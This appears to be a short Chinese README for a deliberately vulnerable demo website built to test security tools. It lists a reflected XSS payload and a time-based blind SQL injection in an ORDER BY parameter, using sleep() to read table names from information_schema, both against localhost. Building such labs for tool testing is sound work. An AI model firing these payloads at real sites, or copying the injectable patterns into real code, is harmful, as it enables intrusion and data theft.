创建次仓库是为了测试安全工具开发而写的存在漏洞的demo网站

payload:

SQL注入支持json，post，get传参where注入

xss

http://127.0.0.1/xss.php?name=\&age=-alert(1)//

order by注入

http://127.0.0.1/orderby.php?orderby=^(2-(if((select%20(SUBSTR((SELECT%20table_name%20FROM%20information_schema.TABLES%20WHERE%20table_schema=(SELECT%20DATABASE())%20limit%201),1,1)=%27u%27)),sleep(1),0)))
